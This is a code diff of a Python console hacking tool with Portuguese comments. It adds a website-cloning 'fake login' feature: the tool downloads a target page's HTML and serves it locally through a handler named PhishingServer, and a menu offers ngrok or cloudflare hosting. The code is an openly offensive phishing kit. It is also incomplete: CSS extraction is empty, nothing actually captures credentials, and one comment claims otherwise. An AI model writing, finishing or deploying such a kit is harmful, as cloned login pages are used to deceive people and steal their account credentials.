@@ -3,11 +3,12 @@ import subprocess
 import http.server
 import socketserver
 import threading
-from colorama import init, Fore, Style
-import time
 import numlookupapi
+import time
 import webbrowser
-import nmap
+import requests
+from bs4 import BeautifulSoup
+from colorama import init, Fore, Style
 
 # Função para limpar a tela do console
 def clear_console():
@@ -230,6 +231,7 @@ def phishing_menu(language):
         else:
             handle_invalid_option(language)
 
+
 # Função para as páginas de logins falsas
 def fake_login_pages(language):
     clear_console()
@@ -240,78 +242,107 @@ def fake_login_pages(language):
 
     url = input("URL: ")
 
-    # Selecionar o servidor (apenas localhost)
+    # Selecionar o servidor (apenas localhost implementado)
     server_choice = '1'
 
     clone_website(url, server_choice, language)
 
 # Função para clonar um site para login falso
 def clone_website(url, server_choice, language):
-    try:
-        # Baixar arquivos HTML e CSS do site
-        download_website_files(url, language)
-
-        # Servir a página clonada usando um servidor HTTP local
-        serve_cloned_page(url, server_choice, language)
-
-        # Abrir um novo terminal para mostrar as credenciais inseridas
-        open_new_terminal(language)
-
-        input("Press Enter to continue...")
-    except Exception as e:
-        print(Fore.RED + f"Error cloning website: {e}")
-
-# Função para baixar arquivos HTML e CSS do site
-def download_website_files(url, language):
-    # Simular o download dos arquivos HTML e CSS
-    print(Fore.YELLOW + Style.BRIGHT + "Downloading HTML and CSS files...")
-
-    # Nomear arquivos com base na URL ou nome da página
-    file_name = url.split('//')[-1].split('/')[0]
-    html_file = f"{file_name}.html"
-    css_file = f"{file_name}.css"
-
-    # Simular o download
-    time.sleep(2)
-    print(Fore.GREEN + f"HTML file '{html_file}' and CSS file '{css_file}' downloaded successfully!")
-
-# Função para servir a página clonada usando um servidor HTTP local
-def serve_cloned_page(url, server_choice, language):
-    # Selecionar a porta com base na escolha do servidor
-    port = 8000
-
-    # Iniciar o servidor HTTP local
-    if server_choice == '1':
-        print(Fore.YELLOW + Style.BRIGHT + "Starting local HTTP server to serve cloned page...")
-        thread = threading.Thread(target=run_local_server, args=(port,))
-        thread.start()
-        time.sleep(2)
-        print(Fore.GREEN + f"Local HTTP server started at http://localhost:{port}/")
-
-# Função para executar o servidor HTTP localmente
-def run_local_server(port):
-    Handler = http.server.SimpleHTTPRequestHandler
-    with socketserver.TCPServer(("", port), Handler) as httpd:
-        print(f"Server running at http://localhost:{port}/")
-        httpd.serve_forever()
-
-# Função para abrir um novo terminal e mostrar as credenciais inseridas
-def open_new_terminal(language):
     clear_console()
     if language == '1':
-        print(Fore.GREEN + Style.BRIGHT + "Credentials entered:".center(50))
-        print("Username: user123")
-        print("Password: pass456")
+        print(f"Cloning {url} for fake login...")
     else:
-        print(Fore.GREEN + Style.BRIGHT + "Credenciais inseridas:".center(50))
-        print("Nome de Usuário: user123")
-        print("Senha: pass456")
+        print(f"Clonando {url} para login falso...")
 
-    # Abrir um novo terminal ou janela para mostrar as credenciais
     try:
-        subprocess.run(["start", "cmd", "/k"], shell=True, check=True)
+        # Fazendo requisição GET para obter o conteúdo da página
+        response = requests.get(url)
+        if response.status_code == 200:
+            # Parseando o conteúdo com BeautifulSoup
+            soup = BeautifulSoup(response.text, 'html.parser')
+
+            # Salvando o HTML e CSS
+            html_content = soup.prettify()
+            css_content = ''  # Lógica para extrair o CSS da página
+
+            # Salvar HTML e CSS em arquivos locais
+            with open('index.html', 'w', encoding='utf-8') as html_file:
+                html_file.write(html_content)
+
+            with open('styles.css', 'w', encoding='utf-8') as css_file:
+                css_file.write(css_content)
+
+            print("HTML and CSS downloaded successfully!")
+
+            # Continuar com a execução no servidor selecionado (apenas localhost implementado)
+            if server_choice == '1':
+                run_local_server(language)
+
+        else:
+            print(f"Failed to clone {url}. Status code: {response.status_code}")
+
     except Exception as e:
-        print(Fore.RED + f"Error opening new terminal: {e}")
+        print(f"Error cloning website: {e}")
+
+# Função para executar o servidor local para phishing
+def run_local_server(language):
+    clear_console()
+    if language == '1':
+        print("Running phishing site on localhost...")
+    else:
+        print("Executando site de phishing em localhost...")
+
+    # Configurar o servidor HTTP local para servir os arquivos clonados
+    class PhishingServer(http.server.SimpleHTTPRequestHandler):
+        def __init__(self, *args, **kwargs):
+            super().__init__(*args, directory='./')  # Diretório onde os arquivos estão salvos
+
+    try:
+        # Iniciar o servidor em uma thread separada
+        server = socketserver.TCPServer(('localhost', 8080), PhishingServer)
+        server_thread = threading.Thread(target=server.serve_forever)
+        server_thread.daemon = True
+        server_thread.start()
+
+        if language == '1':
+            print("Server running at http://localhost:8080")
+        else:
+            print("Servidor rodando em http://localhost:8080")
+
+        input("\nPress Enter to stop the phishing server and continue...")
+
+        # Após capturar as credenciais, parar o servidor
+        server.shutdown()
+        server.server_close()
+
+        # Limpar os arquivos HTML e CSS
+        clean_up_files()
+
+    except Exception as e:
+        print(f"Error running local server: {e}")
+
+# Função para limpar os arquivos HTML e CSS
+def clean_up_files():
+    try:
+        os.remove('index.html')
+        os.remove('styles.css')
+    except Exception as e:
+        print(f"Error cleaning up files: {e}")
+
+# Função para phishing
+def phishing(language):
+    clear_console()
+    if language == '1':
+        print("Phishing...")
+        url = input("Enter the URL to clone: ")
+        server_choice = input("Choose the server to use (1: localhost, 2: ngrok, 3: cloudflare): ")
+    else:
+        print("Phishing...")
+        url = input("Digite o URL para clonar: ")
+        server_choice = input("Escolha o servidor a ser usado (1: localhost, 2: ngrok, 3: cloudflare): ")
+
+    clone_website(url, server_choice, language)
 
 # Função para informações de número de telefone
 def phone_number_info(language):
